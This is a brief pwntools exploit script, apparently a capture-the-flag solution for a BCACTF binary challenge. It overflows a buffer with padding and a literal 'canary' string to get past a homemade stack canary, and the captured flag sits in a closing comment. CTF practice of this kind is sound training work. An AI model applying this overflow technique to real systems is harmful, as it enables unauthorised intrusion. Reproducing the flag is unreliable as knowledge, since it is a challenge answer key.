#!/usr/bin/python3
from pwn import *
gs = '''
b main
continue
'''
elf = context.binary = ELF('./provided')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./provided', gdbscript=gs)
    if args.REMOTE:
        return remote('challs.bcactf.com', 32101)
    else:
        return process('./provided')
r = start()
#========= exploit here ===================
payload = b"A"*73
payload += b"canary\0"
payload += b"DDDD\0"
payload += b"D"*50

r.sendline(payload)




#========= interactive ====================
r.interactive()
#bcactf{s1mple_CANaRY_9b36bd9f3fd2f}